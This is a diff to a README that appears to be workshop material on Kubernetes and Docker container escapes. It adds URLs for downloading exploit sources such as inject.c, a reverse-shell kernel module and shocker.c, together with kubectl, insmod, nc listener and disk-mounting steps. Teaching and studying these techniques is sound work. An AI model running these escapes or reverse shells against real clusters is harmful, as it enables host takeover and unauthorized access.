@@ -25,7 +25,7 @@ capsh --print
 Run privileged pod
 
 ```shell
-kubectl apply -f 
+kubectl apply -f https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/privileged/priv-hostpid.yaml
 kubectl exec -it privileged-hostpid -- bash
 ```
 
@@ -40,21 +40,22 @@ ls -la /
 ## Mounting Disk
 
 ```shell
-kubectl apply -f 
+kubectl apply -f https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/privileged/priv.yaml
 kubectl exec -it privileged -- bash
 ```
 
+Find device mounted to host root.
 ```shell
-$ cat /proc/cmdline
-init=/init loglevel=1 root=/dev/vdb rootfstype=erofs ro vsyscall=emulate panic=0 linuxkit.unified_cgroup_hierarchy=1 console=hvc0 tsc=reliable  virtio_net.disable_csum=1 eth0.IPNet=192.168.65.3/24 eth0.router=192.168.65.1 eth0.mtu=65535 eth1.dhcp vpnkit.connect=connect://2/1999 com.docker.VMID=2ebe4eef-0e69-4cab-9c09-0ba5ca9fcd57
-$ blkid
-/dev/vdb: UUID="f77c9dcd-aa75-4115-9035-4ace04a5efae" BLOCK_SIZE="4096" TYPE="erofs"
-/dev/vdc: UUID="5c6189ad-6080-41e6-827f-f4f302ada263" BLOCK_SIZE="4096" TYPE="erofs"
-/dev/vda1: UUID="9e7b9c89-6577-4495-80ee-fd511f955bd1" BLOCK_SIZE="4096" TYPE="ext4" PARTUUID="d08fb88d-01"
-$ mount -o ro /dev/vda1 /mnt
-$ ls -la /mnt
+cat /proc/cmdline
+blkid
+```
+
+Mount device or explore it
+```shell
+mount -o ro /dev/vda1 /mnt
+ls -la /mnt
 # or
-$ debugfs /dev/vda1
+debugfs /dev/vda1
 ```
 
 References:
@@ -66,8 +67,8 @@ References:
 
 Deploy pods
 ```shell
-kubectl apply -f 
-kubectl apply -f 
+kubectl apply -f https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/host_network/nginx.yaml
+kubectl apply -f https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/host_network/pod.yaml
 kubectl get svc nginx
 kubectl logs -f nginx-client
 kubectl exec -it host-network -- bash
@@ -79,22 +80,13 @@ ifconfig
 tcpdump -i any -v 'tcp and host 10.110.149.83'
 ```
 
-
-# 2 shells and mknode cap
-
-https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot
-
-https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/
-
 # Excessive Capabilities
 
 ## CAP\_SYS\_PTRACE + hostPid
 
 Spawn container
 ```shell
-docker run -it --rm --cap-add=SYS_PTRACE --pid=host  ubuntu bash
-# or
-kubectl apply -f ...
+kubectl apply -f https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/cap_sys_ptrace/pod.yaml
 kubectl exec -it cap-sys-ptrace -- bash
 ```
 
@@ -108,7 +100,7 @@ gdb <pid>
 ```
 
 ```shell
-curl -L -o inject.c ...
+curl -L -o inject.c https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/cap_sys_ptrace/inject.c
 gcc ./inject.c
 ./a.out
 ```
@@ -120,6 +112,11 @@ References:
 
 
 ## CAP\_SYS\_MODULE
+Deploy pod
+```shell
+kubectl apply -f https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/cap_sys_module/pod.yaml
+kubectl exec -it cap-sys-module -- bash
+```
 
 Print kernel version, architecture, hostname and build date
 ```shell
@@ -138,8 +135,8 @@ apt install linux-headers-$(uname -r)
 
 Change address to connect and compile module
 ```shell
-curl -L -o Makefile
-curl -L -o reverse-shell.c
+curl -L -o Makefile https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/cap_sys_module/Makefile
+curl -L -o reverse-shell.c https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/cap_sys_module/reverse-shell.c
 ifconfig
 vim reverse-shell.c
 make
@@ -150,6 +147,7 @@ Start listenning no port 4444 for reverse shell and install module.
 nc -klvnp 4444 &
 insmod reverse-shell.ko
 ```
+
 If you want to install module again, remove it before installing
 ```shell
 rmmod reverse-shell.ko
@@ -168,12 +166,13 @@ References:
 
 Create pod
 ```shell
-k apply -f 
+kubectl apply -f https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/cap_dac_read_search/pod.yaml
+kubectl exec -it cap-dac-read-search -- bash
 ```
 
 Compile shocker exploit
 ```shell
-curl -LO http://stealth.openwall.net/xSports/shocker.c
+curl -LO https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/cap_dac_read_search/shocker.c
 gcc ./shocker.c -o ./shocker
 ```
 
@@ -206,14 +205,20 @@ References:
 ## CAP\_DAC\_READ\_SEARCH + CAP\_DAC\_READ\_SEARCH
 
 Same as above, but you can write to any file now. Just overwrite `authorized_keys` file.
+```shell
+curl -L -o shocker_write.c https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/cap_dac_override/shocker_write.c
+```
+
 ## CAP\_SYS\_ADMIN
 
-[Understanding docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
-
 ```shell
-k apply -f - 
-k exec -it cap-sys-admin -- bash
+kubectl apply -f https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/cap_sys_admin/pod.yaml
+kubectl exec -it cap-sys-admin -- bash
 ```
+
+References:
+  - [Understanding docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
+
 
 ### CVE-2022-0492
 
@@ -235,3 +240,10 @@ References:
   - [CAP_SYS_ADMIN Abusing usermod helper API](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#abusing-usermode-helper-api)
 
 
+# 2 shells and mknode cap
+
+We can escalate privileges when we have non-root user on the host and root in container.
+
+References:
+- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)
+- [HTB 2021 Uni CTF Quals - GoodGames writeup](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/)
